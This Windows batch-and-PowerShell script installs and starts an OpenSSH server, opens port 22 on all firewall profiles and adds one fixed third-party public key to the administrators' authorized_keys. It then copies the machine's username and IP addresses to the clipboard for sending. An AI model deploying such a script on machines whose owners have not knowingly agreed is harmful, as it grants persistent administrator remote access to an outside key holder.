@echo off
setlocal
title Setup Windows OpenSSH Server

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [INFO] Requesting Administrator privileges...
    set "SELF=%~f0"
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath $env:SELF -Verb RunAs"
    exit /b
)

set "SELF=%~f0"
powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content -LiteralPath $env:SELF; $i = [Array]::IndexOf($c, ':: === PS_START ==='); Invoke-Expression ($c[($i+1)..($c.Count-1)] -join [char]10)"

echo.
pause
exit /b

:: === PS_START ===
$ErrorActionPreference = "Stop"

try {
    Write-Host "[1/4] Checking OpenSSH Server..." -ForegroundColor Cyan
    if (-not (Get-Service -Name sshd -ErrorAction SilentlyContinue)) {
        Write-Host "      Installing OpenSSH.Server (may take 15-60s)..." -ForegroundColor Yellow
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 | Out-Null
    }

    New-Item -ItemType Directory -Force -Path "C:\ProgramData\ssh" | Out-Null
    Start-Service sshd
    Set-Service -Name sshd -StartupType Automatic
    Write-Host "      sshd service is running." -ForegroundColor Green

    Write-Host "[2/4] Configuring Windows Firewall (TCP 22)..." -ForegroundColor Cyan
    if (-not (Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP-22" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -Name "OpenSSH-Server-In-TCP-22" -DisplayName "OpenSSH Server (TCP 22)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -Profile Any | Out-Null
    }
    Write-Host "      Firewall rule ready." -ForegroundColor Green

    Write-Host "[3/4] Installing SSH public key..." -ForegroundColor Cyan
    $pubKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAoG+HTQJtFO/MEu59K9iTze7juaTr2sjs8qtsmKm99R xia_ziqiang_nju"

    $userSsh = Join-Path $HOME ".ssh"
    New-Item -ItemType Directory -Force -Path $userSsh | Out-Null
    $userAuth = Join-Path $userSsh "authorized_keys"
    if (-not (Test-Path $userAuth) -or -not ((Get-Content $userAuth -Raw -ErrorAction SilentlyContinue) -match [regex]::Escape($pubKey))) {
        Add-Content -Path $userAuth -Value $pubKey -Encoding ascii
    }

    $adminAuth = "C:\ProgramData\ssh\administrators_authorized_keys"
    if (-not (Test-Path $adminAuth) -or -not ((Get-Content $adminAuth -Raw -ErrorAction SilentlyContinue) -match [regex]::Escape($pubKey))) {
        Add-Content -Path $adminAuth -Value $pubKey -Encoding ascii
    }
    icacls.exe $adminAuth /inheritance:r /grant "*S-1-5-32-544:F" /grant "*S-1-5-18:F" | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "icacls failed with exit code $LASTEXITCODE"
    }
    Restart-Service sshd
    Write-Host "      Public key configured." -ForegroundColor Green

    Write-Host "[4/4] Collecting connection info..." -ForegroundColor Cyan
    $netList = Get-NetIPAddress -AddressFamily IPv4 |
        Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' -and $_.PrefixOrigin -ne 'WellKnown' } |
        ForEach-Object { "$($_.InterfaceAlias): $($_.IPAddress)" }

    $summary = @(
        "=== SSH Setup Completed ==="
        "Username : $env:USERNAME"
        "Whoami   : $(whoami)"
        "IPv4     :"
        ($netList | ForEach-Object { "  - $_" })
    ) -join "`r`n"

    Write-Host ""
    Write-Host $summary -ForegroundColor Green

    try {
        Set-Clipboard -Value $summary
        Write-Host "`n[OK] Connection info has been copied to clipboard! Just press Ctrl+V to send." -ForegroundColor Yellow
    } catch {}
} catch {
    Write-Host "`n[ERROR] Setup failed: $_" -ForegroundColor Red
    if ($_.ScriptStackTrace) {
        Write-Host $_.ScriptStackTrace -ForegroundColor DarkRed
    }
}
